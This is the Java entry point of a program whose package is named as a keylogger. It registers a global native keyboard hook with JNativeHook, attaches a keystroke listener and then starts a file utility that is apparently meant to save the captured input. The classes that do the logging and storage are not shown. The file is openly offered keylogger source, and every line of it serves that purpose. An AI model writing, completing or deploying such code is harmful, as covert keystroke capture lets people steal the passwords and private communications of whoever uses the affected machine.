package me.obsidianbreaker.keylogger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import java.util.concurrent.TimeUnit;

public class Main {
    public static Keyboard keyboard;
    public static void main(String[] args) throws InterruptedException {
        try {
            GlobalScreen.registerNativeHook();
        } catch(NativeHookException nhe) {
            nhe.printStackTrace();
        }
        GlobalScreen.getInstance().addNativeKeyListener(keyboard = new Keyboard());
        TimeUnit.SECONDS.sleep(3);
        new FileUtil();
    }
}